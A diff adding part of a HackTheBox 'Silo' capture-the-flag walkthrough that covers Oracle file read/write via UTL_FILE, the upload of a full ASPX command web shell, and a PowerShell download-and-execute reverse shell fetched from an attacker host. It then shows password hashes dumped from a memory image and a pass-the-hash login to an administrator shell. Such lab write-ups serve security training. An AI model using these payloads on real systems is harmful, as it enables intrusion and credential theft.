@@ -491,8 +491,292 @@ SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
 
 ```
 
+This also allows us to do cool things like reading the files and if `java` is installed then it also allows us to run `java` files.
+
+So, now, we declare a varible and write a program to read the `iisstart.htm` file
+
+```
+SQL> declare
+  2    f utl_file.file_type;
+  3    s varchar(200);
+  4  begin
+  5    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
+  6    utl_file.get_line(f, s);
+  7    utl_file.fclose(f); 
+  8    dbms_output.put_line(s);
+  9  end;
+ 10  /
+
+PL/SQL procedure successfully completed.
+
+```
+
+Now, it didnt give any output, so I decided to turn on the `serveroutput` variable
+
+```
+SQL> set serveroutput ON
+SQL> /
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+PL/SQL procedure successfully completed.
+```
+
+Running the program again, we see the beginning of the `HTML` file.
+
+This means that we can actually read the files on the system.
+
+Next, I tried to write files on the database.
+
+```
+declare
+  f utl_file.file_type
+  s varchar(500) := 'Hello';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'hello.txt', 'W');
+  utl_file.put_line(f, s);
+  utl_file.fclose(f);
+end; 
+
+```
+
+Pasted the above code in the SQL terminal
+
+```
+SQL> declare
+  f utl_file.file_type;
+  s varchar(500) := 'Hello';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'hello.txt', 'W');
+  utl_file.put_line(f, s);
+  utl_file.fclose(f);
+end;  2    3    4    5    6    7    8  
+  9  /
+
+PL/SQL procedure successfully completed.
+
+```
+
+And visited the `/hello.txt` on port `80`.
+
+![s-2](https://user-images.githubusercontent.com/87711310/217783890-0bc2668c-af89-4ca5-b7b2-3f064cda8cfd.png)
+
+So, now that I was able to write files on the system and run it, the next thing I was gonna do is to write and upload a web-shell.
+
+```
+declare
+  f utl_file.file_type;
+  s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'command.aspx', 'W');
+  utl_file.put_line(f, s);
+  utl_file.fclose(f);
+end;
+```
+
+```
+SQL> declare
+  f utl_file.file_type;
+  s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'command.aspx', 'W');
+  utl_file.put_line(f, s);
+  utl_file.fclose(f);
+end;  2    3    4    5    6    7    8  
+  9  /
+
+PL/SQL procedure successfully completed.
+```
+
+Once, I got `procedure successfully completed`, I visited the `/commad.aspx` on port `80` and got back a web-shell.
+
+![s-3](https://user-images.githubusercontent.com/87711310/217787861-08fe8998-e118-4401-9175-d9e25ba31c12.png)
+
+I tried executing couple of basic commands to see if it was working properly. 
+
+![s-4](https://user-images.githubusercontent.com/87711310/217788420-a710be3e-f77a-4955-8c79-6a0f687f6491.png)
+
+I also did `whoami /all` and I saw that I had `SeImpersonatePrivilege` so the `rotten potato` would work on this.
+
+But I decided not to use rotten potato and try and get a reverse shell using `nishang`.
+
+```
+┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/Silo/shells]
+└─$ cp /opt/Windows/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+
+┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/Silo/shells]
+└─$ mv Invoke-PowerShellTcp.ps1 rev.ps1
+```
+
+Adding the following line at the end of the rev.ps1 file.
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.x.x -Port 9999
+```
+
+Hosting the file using the `python http.server` command 
+```
+┌──(darshan㉿kali)-[/opt]
+└─$ python3 -m http.server 8081
+```
+
+Using the powershell command to get the file on the server
+
+```
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.x.x:8081/rev.ps1')"
+```
+
+Before hitting enter, I turned on my `netcat` listener, and once I hit enter, I get back a reverse shell on my machine.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.10.82] 49202
+Windows PowerShell running as user SILO$ on SILO
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv>whoami
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv> 
+```
+
+And I was able to grab the user flag.
+
+```
+PS C:\Users\Phineas\Desktop> type user.txt
+[REDACTED]
+```
+
+## Privilege Escalation
+Along with the `user flag`, there was a `Oracle issue.txt` file.
+
+```
+PS C:\Users\Phineas\Desktop> type "Oracle issue.txt"
+Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
+
+Dropbox link provided to vendor (and password under separate cover).
+
+Dropbox link 
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+link password:
+?%Hm8646uC$
+```
+
+NOTE: The `?` in the password is actually a `£` symbol. So the correct password is `£%Hm8646uC$`
+
+I visited the `Dropbox` link and entered the password.
 
 
+![s-6](https://user-images.githubusercontent.com/87711310/217797335-e747abef-e924-46ee-8b5d-dd9107e5c3c3.png)
+
+I found a zip file named `Silo`, so I was sure that this might be helpful in privilege escalation somehow. So, I downloaded the file, unzipped it and checked it out.
 
 
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
+└─$ mv /home/kali/Downloads/SILO-20180105-221806.zip .
+                                                             
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
+└─$ file SILO-20180105-221806.zip 
+SILO-20180105-221806.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
+                                                                         
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
+└─$ unzip SILO-20180105-221806.zip 
+Archive:  SILO-20180105-221806.zip
+  inflating: SILO-20180105-221806.dmp 
+```
 
+Since it was a dump file, i had to install volatility and use it to dump its contents. First, I ran the basic imageinfo command.
+
+```
+┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
+└─# ./volatility -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp imageinfo
+```
+
+Before further enumerating using `Volatility`, I decided to look at the OS name and OS version of the victim machine.
+
+```
+PS C:\Users\Phineas\Desktop> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+```
+
+Then, I ran the `kdbgscan` module from the volatility framework
+
+
+```
+┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
+└─# ./volatility kdbgscan -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp 
+Volatility Foundation Volatility Framework 2.6
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)
+Offset (V)                    : 0xf80078520a30
+Offset (P)                    : 0x2320a30
+KdCopyDataBlock (V)           : 0xf8007845f9b0
+Block encoded                 : Yes
+Wait never                    : 0xd08e8400bd4a143a
+Wait always                   : 0x17a949efd11db80
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2012R2x64_18340
+Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
+PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
+PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
+KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
+Major (OptionalHeader)        : 6
+Minor (OptionalHeader)        : 3
+KPCR                          : 0xfffff8007857b000 (CPU 0)
+KPCR                          : 0xffffd000207e8000 (CPU 1)
+
+**************************************************
+...
+```
+
+The above mentioned profile works with other commands, so it seems to fit. After some playing around, the `Win2012R2x64` actually fits better, so we’ll work with that.
+
+Volatility has a [long list of plugins](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) we can use.
+
+After a bunch of enumeration, found hashes in the `memory dump`. First we’ll need to get offsets for the registry hives in memory, and then we can use the `hashdump` plugin:
+
+```
+┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
+└─# ./volatility -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
+Volatility Foundation Volatility Framework 2.6
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+```
+
+Now that I got the hashes, I can do a `Pass the Hash` attack using a pre-installed kali tool, `pth-winexe`
+
+```
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
+```
+
+Once we hit send, we get a `root` shell
+
+
+```
+┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
+└─# pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+silo\administrator
+```
+```
+
+And I was able to grab the `root` flag
+
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+[REDACTED]
+```
